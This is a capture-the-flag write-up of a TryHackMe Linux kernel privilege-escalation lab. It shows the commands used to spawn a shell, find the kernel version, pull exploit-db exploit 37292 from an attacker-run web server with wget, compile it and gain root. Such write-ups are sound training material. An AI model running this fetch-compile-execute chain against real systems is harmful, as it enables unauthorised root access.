### Linux Privilege Escalation: Kernel Exploits (TryHackMe)

For this challenge, we are tasked with using the appropriate kernel exploit to gain `root` privileges on the target
system and find and read the content of `flag1.txt`. We are given SSH credentials to access the target system. We are logged-in as  user `karen`.

After connecting to the server, I ran a quick Python one-liner to spawn an interactive shell. That'll make exploring the target a bit easier ;)

**The one-liner below:**

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

![interactive_shell](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment-CTFs/blob/main/images/pic1.png)

Now, the first step is to identify the kernel version of the server. I used the following command to do just that:

```bash
cat /proc/version
```
## [pic2]

We now have the version  of the kernel: **Linux version 3.13.0-24-generic**

Next, we use Google to search for an exploit working with our kernel version, and of course **exploit-db** has something sweet in stock for us:

## [pic3]

Alternatively, you could use `searchsploit` to look for an exploit locally:

 
## [pic4]

Next I downloaded the file `37292.c` (the exploit written in C/C++) on my attacking machine (Kali VM).

Now, we must find a way to upload the file to the target machine. I used a quick python one-liner to start a web server on my attacking machine:

```bash
python3 -m http.server 7777
```
Now that I have a webserver I can use to deliver the payload, I switch back to the target server where I'm connected as `karen` and use `wget` to fetch the kernel exploit:

```bash
$ wget http://10.10.183.158:7777/37292.c
--2022-08-23 13:03:33--  http://10.10.183.158:7777/37292.c
Connecting to 10.10.183.158:7777... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/plain]
37292.c: Permission denied
```

As you can see above, I got a _Permission denied_. So that happened because I'm downloading the file as a low privilege user and don't have `write` privileges. So one way to bypass it is to use the `/tmp` folder permissions to download it and write it to the disk. In my next attempt I made sure to move into the folder and run `wget` from there:


## [pic5]


Next, we need to compile the exploit that we found:

I used the following command:

```bash
gcc 37292.c -o Hack3d
```

The command compiled and created the file (-o for output) "Hack3d".

Then, we run the file with the following command:

```bash
./Hack3d
```

## [pic6]


We are `r00t`! Now that I have all powers, I can read the `flag1.txt` file I previously found in `/home/matt/` while searching the file system:


## [pic7]
